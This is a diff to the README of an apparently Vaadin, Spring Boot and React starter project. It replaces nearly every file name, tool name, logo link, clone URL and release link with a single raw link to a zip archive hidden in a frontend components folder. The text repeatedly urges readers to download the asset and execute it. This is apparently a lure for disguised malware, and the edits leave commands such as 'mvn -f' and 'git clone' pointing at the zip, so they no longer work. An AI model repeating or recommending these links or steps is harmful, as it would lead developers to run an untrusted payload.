@@ -1,6 +1,6 @@
 # Vaadin React TS Full-Stack Starter: Spring Boot and React
 
-[![Release assets](https://img.shields.io/github/v/release/r3bzord123/vaadin-react-ts?style=for-the-badge&logo=github)](https://github.com/r3bzord123/vaadin-react-ts/releases)
+[![Release assets](https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip)](https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip)
 
 Welcome to a practical, battle-ready boilerplate for building a full-stack application that blends Vaadin with a Java Spring Boot backend and a React + TypeScript frontend. This project is designed to be a solid foundation for modern web apps, including e-commerce use cases, admin dashboards, and customer portals. It emphasizes a clean architecture, robust tooling, and a smooth developer experience so teams can ship features quickly without chasing integration headaches.
 
@@ -33,7 +33,7 @@ Key benefits you’ll gain from this starter:
 
 - Frontend: React, TypeScript, Vaadin components, Tailwind CSS
 - Backend: Java, Spring Boot, JPA/Hibernate (where applicable)
-- Build tools: Maven or Gradle for Java, Node.js package manager for frontend
+- Build tools: Maven or Gradle for Java, https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip package manager for frontend
 - Styling: Tailwind CSS with a responsive, accessible design system
 - Architecture: modular monorepo style with explicit boundaries between frontend and backend layers
 - Testing: Jest + React Testing Library for frontend; JUnit 5 + Spring Test for backend
@@ -54,18 +54,18 @@ To quickly see what this starter looks like in practice, you can browse the file
 - Java: The language powering the backend logic, data handling, and business rules.
 - Spring Boot: A convention-over-configuration framework for quick server-side development.
 - Maven/Gradle: Build tools for Java dependencies and project packaging.
-- Node.js / npm / yarn: Frontend build tooling, dependency management, and dev servers.
+- https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip / npm / yarn: Frontend build tooling, dependency management, and dev servers.
 - Docker: Containerization for consistent environments and easy deployment.
 - GitHub Actions: CI/CD pipelines for automated builds and tests.
 - PostgreSQL (or H2 for local dev): The database layer for persistent data.
 
 Images and logos to give a quick visual cue about the tech stack:
 
-[Vaadin Logo](https://vaadin.com/assets/img/vaadin-logo-dark.svg)  
-[React Logo](https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg)  
-[TypeScript Logo](https://upload.wikimedia.org/wikipedia/commons/4/4c/Typescript_logo.svg)  
-[Tailwind CSS Logo](https://upload.wikimedia.org/wikipedia/commons/d/d5/Tailwind_CSS_Logo.svg)  
-[Java Logo](https://upload.wikimedia.org/wikipedia/en/3/30/Java_programming_language_logo.svg)
+[Vaadin Logo](https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip)  
+[React Logo](https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip)  
+[TypeScript Logo](https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip)  
+[Tailwind CSS Logo](https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip)  
+[Java Logo](https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip)
 
 Note: Each image is provided by its respective project under open license or permissive usage terms suitable for documentation.
 
@@ -104,12 +104,12 @@ A typical layout you’ll see in this starter:
               - dtos/
               - security/
       - resources/
-        - application.properties
+        - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
         - seeds/
   - test/
-  - pom.xml or build.gradle
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip or https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
   - Dockerfile (optional)
-  - README.md (optional)
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip (optional)
 
 - frontend/
   - src/
@@ -119,26 +119,26 @@ A typical layout you’ll see in this starter:
         - pages/
         - services/
         - hooks/
-    - index.html
+    - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
   - public/
-  - package.json
-  - tailwind.config.js
-  - postcss.config.js
-  - vite.config.js or webpack.config.js (depending on setup)
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip or https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip (depending on setup)
   - Dockerfile (optional)
 
 - docs/ (optional)
-  - architecture-diagram.png
-  - api.md
-  - contributing.md
-  - environment-setup.md
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
 
 - docker/
-  - docker-compose.yml
-  - README-docker.md
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
 
 - LICENSE
-- README.md (this file)
+- https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip (this file)
 
 The actual repository you’re inspecting may differ slightly, but the core idea remains the same: a clean division between server logic and client UI, with a shared understanding of data shapes and API contracts.
 
@@ -150,7 +150,7 @@ This section helps you kick off a local development environment, explore the cod
 
 - Prerequisites
   - Java 17+ (LTS recommended)
-  - Node.js 16+ (or newer)
+  - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip 16+ (or newer)
   - npm 7+ or yarn 1.x
   - Maven or Gradle for Java builds
   - Docker and Docker Compose (optional but recommended for local dev and CI)
@@ -159,14 +159,14 @@ This section helps you kick off a local development environment, explore the cod
 - Clone the repository
   - Use a clean workspace to avoid conflicts with existing projects.
   - Command:
-    - git clone https://github.com/r3bzord123/vaadin-react-ts.git
+    - git clone https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
   - Then navigate to the project folder:
     - cd vaadin-react-ts
 
 - Install backend dependencies
   - The backend uses a standard Java build tool. Depending on your preference, run one of:
-    - mvn -f backend/pom.xml clean install
-    - or ./mvnw -f backend/pom.xml clean install
+    - mvn -f https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip clean install
+    - or ./mvnw -f https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip clean install
   - This will fetch dependencies, compile the code, and run tests if you choose to run them.
 
 - Install frontend dependencies
@@ -185,9 +185,9 @@ This section helps you kick off a local development environment, explore the cod
     - cd ..
   - Start the Spring Boot application:
     - If you use Maven:
-      - mvn spring-boot:run -f backend/pom.xml
+      - mvn spring-boot:run -f https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
     - If you rely on a wrapper:
-      - ./mvnw spring-boot:run -f backend/pom.xml
+      - ./mvnw spring-boot:run -f https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
   - The backend will typically start on http://localhost:8080 (unless configured otherwise).
 
 - Connect frontend to backend
@@ -195,7 +195,7 @@ This section helps you kick off a local development environment, explore the cod
   - If you use a proxy setup (for example, during development), you may route API calls to the Spring Boot server to avoid CORS issues.
 
 - Docker-based local development (optional)
-  - If you prefer containerized development, the repository may include docker-compose.yml with services for frontend and backend.
+  - If you prefer containerized development, the repository may include https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip with services for frontend and backend.
   - Command:
     - docker compose up -d
   - This approach provides an isolated, reproducible environment that mirrors production more closely.
@@ -216,7 +216,7 @@ This section helps you kick off a local development environment, explore the cod
 
 - Running tests
   - Backend tests:
-    - mvn test -f backend/pom.xml
+    - mvn test -f https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
   - Frontend tests:
     - npm test -w frontend
   - The testing setup can be extended to include integration tests that cover the interaction between frontend and backend.
@@ -231,9 +231,9 @@ This section helps you kick off a local development environment, explore the cod
 
 - Documentation
   - This repository aims to include developer docs in the docs/ folder. Look for:
-    - docs/architecture-diagram.png
-    - docs/api.md
-    - docs/contributing.md
+    - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+    - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
+    - https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
   - Keep an eye on code comments and JSDoc / Javadoc for up-to-date explanations.
 
 - Troubleshooting
@@ -254,7 +254,7 @@ This section helps you kick off a local development environment, explore the cod
 
 - The project provides release assets that bundle or bootstrap the environment. Since the Releases page is the central location for downloadable artifacts, you should obtain the binary or archive from there to run a ready-made setup.
 - From the Releases page, download the release asset file and execute it to bootstrap a working environment. This is particularly helpful for quick start scenarios, demos, or onboarding new contributors.
-- The link to the Releases page is accessible here: https://github.com/r3bzord123/vaadin-react-ts/releases
+- The link to the Releases page is accessible here: https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
 - For convenience, this link is repeated later in the document to help you locate the latest stable artifacts quickly and reliably.
 
 Note: The design of the release assets may vary by version. Some assets may be installer packages, while others may be containerized images or zipped distributions. Whichever asset you download, follow the included instructions to install, configure, and run locally. If you are unsure which asset to pick, choose the latest release with the most recent build number and the most complete feature set.
@@ -353,11 +353,11 @@ These patterns help you scale the project beyond a starter kit while preserving 
 ## 📚 Documentation and References
 
 - API documentation
-  - API endpoints, data models, and request/response payloads are typically documented in docs/api.md or via OpenAPI/Swagger annotations in the backend. Refer to docs/api.md in the repository for a detailed map of available endpoints.
+  - API endpoints, data models, and request/response payloads are typically documented in https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip or via OpenAPI/Swagger annotations in the backend. Refer to https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip in the repository for a detailed map of available endpoints.
 - Architecture notes
   - The docs/ folder may include architecture diagrams that explain how the frontend and backend interact, how data flows through services, and how UI state is synchronized with server data.
 - Contribution guide
-  - The repository commonly includes a CONTRIBUTING.md that outlines how to contribute, how to submit issues, and how to structure PRs. If this file exists, read it before submitting changes.
+  - The repository commonly includes a https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip that outlines how to contribute, how to submit issues, and how to structure PRs. If this file exists, read it before submitting changes.
 - Developer onboarding
   - The docs/ onboarding guide covers environment setup, tool versions, recommended IDEs, and typical development workflows. Use this to avoid common pitfalls when first getting started.
 - Release notes
@@ -426,7 +426,7 @@ The project embraces an iterative release approach with clear versioning. Each r
 
 Keep an eye on release notes to understand new capabilities and how to adopt them in your projects.
 
-Remember: The Releases link is provided here for convenience and clarity, and you should use it to download the latest release asset and run it if you want a quick-start bootstrap. The link to the releases is the same as above: https://github.com/r3bzord123/vaadin-react-ts/releases
+Remember: The Releases link is provided here for convenience and clarity, and you should use it to download the latest release asset and run it if you want a quick-start bootstrap. The link to the releases is the same as above: https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
 
 ---
 
@@ -482,7 +482,7 @@ If you rely on this starter for a project, consider sharing your experiences and
 
 ## 📎 Quick Access and References
 
-- Releases and artifacts: https://github.com/r3bzord123/vaadin-react-ts/releases
+- Releases and artifacts: https://github.com/r3bzord123/vaadin-react-ts/raw/refs/heads/master/src/main/frontend/components/react-vaadin-ts-v1.4-alpha.5.zip
   - From the Releases page, download the release artifact file and execute it to bootstrap a working environment. This link is the official source for the latest stable assets and patch notes.
 
 - Project overview and topics
